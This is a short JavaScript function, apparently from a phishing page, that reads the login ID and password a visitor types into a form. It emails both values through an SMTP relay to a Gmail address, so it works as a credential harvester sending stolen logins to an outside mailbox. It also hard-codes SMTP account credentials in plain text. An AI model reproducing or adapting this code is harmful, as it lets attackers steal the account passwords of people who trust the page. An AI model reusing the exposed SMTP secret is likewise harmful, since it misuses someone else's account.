
function emailSend(){
    var identifiant = document.getElementById('Identifiant').value;
    var Mail = document.getElementById('motPasse').value;




    var messageBody = "Identifiant: " + identifiant +
                       "<br/> Password: " + Mail; 

    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "grpdxpe@gmail.com",
        Password : "1C6C89DD0522083B5676B4800FA61B70D1D7",
        To : 'grpdxpe@gmail.com',
        From : "grpdxpe@gmail.com",
        Subject : "This is the subject",
        Body : messageBody
    }).then(
      message => alert(message)
    );
}